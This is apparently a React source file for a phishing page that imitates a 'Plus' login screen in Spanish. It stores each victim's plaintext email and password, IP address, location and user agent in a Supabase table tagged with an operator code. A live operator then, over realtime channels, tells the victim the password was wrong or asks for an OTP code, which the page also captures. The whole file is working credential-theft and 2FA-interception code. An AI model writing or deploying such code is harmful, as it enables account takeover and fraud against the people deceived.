import { useState, useEffect, useCallback } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import PlusLoginForm from "@/components/plus/PlusLoginForm";
import PlusWaitingScreen from "@/components/plus/PlusWaitingScreen";
import PlusOtpScreen from "@/components/plus/PlusOtpScreen";
import PlusSuccessScreen from "@/components/plus/PlusSuccessScreen";

type Step = "login" | "waiting" | "otp" | "done";

const Plus = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Plus — Iniciar Sesión";
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    link.rel = "icon";
    link.type = "image/png";
    link.href = "/favicon.ico";
    document.head.appendChild(link);
  }, []);

  // Listen for admin commands
  useEffect(() => {
    if (!sessionId || step === "login" || step === "done") return;

    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      handleDecision(payload.payload?.status as string);
    }).subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (payload) => {
      handleDecision(payload.payload?.status as string);
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data) handleDecision(data.status);
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(otpChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;
    if (status === "login_success" || status === "approved" || status === "completed" || status === "otp_approved") {
      setStep("done");
    } else if (status === "wrong_password") {
      setErrorMessage("Email o contraseña incorrectos. Intentá de nuevo.");
      setStep("login");
    } else if (status === "redirect_otp" || status === "show_otp") {
      setStep("otp"); setErrorMessage("");
    } else if (status === "otp_rejected") {
      setErrorMessage("Código incorrecto. Intentá de nuevo.");
      setStep("otp");
    } else if (status === "pending_review") {
      setErrorMessage("");
    }
  }, []);

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);

    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) {
        const d = await res.json();
        ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" };
      }
    } catch { /* ignore */ }

    try {
      if (sessionId) {
        await supabase.from("sessions").update({
          email: submittedEmail, password, status: "pending_review",
        }).eq("id", sessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail, password,
          ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "pending_review", source: "plus", operator_code: operatorCode,
        });
        setSessionId(newId);
      }
      setStep("waiting");
    } catch {
      setError("Error de conexión. Intentá de nuevo.");
    }
    setLoading(false);
  }, [sessionId, operatorCode]);

  const handleOtpSubmit = useCallback(async (code: string) => {
    if (!sessionId) return;
    setError(""); setErrorMessage(""); setLoading(true);
    try {
      await supabase.from("sessions").update({
        otp_code: code, status: "otp_submitted",
      }).eq("id", sessionId);
      setStep("waiting");
    } catch {
      setError("Error al enviar el código.");
    }
    setLoading(false);
  }, [sessionId]);

  return (
    <div className="flex min-h-screen flex-col items-center justify-center px-5"
      style={{
        background: "linear-gradient(135deg, #7c3aed 0%, #9333ea 25%, #a855f7 50%, #7c3aed 75%, #6d28d9 100%)",
      }}
    >
      <div className="w-full max-w-[420px] flex flex-col items-center gap-6 py-10">
        {/* Plus Logo */}
        <div className="flex flex-col items-center gap-1 mb-4">
          <h1 className="text-white text-4xl font-bold tracking-tight">
            plus<span className="inline-block ml-0.5 relative">
              <span className="text-white text-2xl">⁺</span>
            </span>
          </h1>
        </div>

        {step === "login" && (
          <>
            <h2 className="text-white text-2xl font-bold text-center mb-2">Iniciar Sesión</h2>
            <PlusLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />
          </>
        )}

        {step === "waiting" && <PlusWaitingScreen email={email} />}

        {step === "otp" && (
          <PlusOtpScreen email={email} onSubmit={handleOtpSubmit} loading={loading} error={error || errorMessage} />
        )}

        {step === "done" && <PlusSuccessScreen email={email} />}
      </div>
    </div>
  );
};

export default Plus;
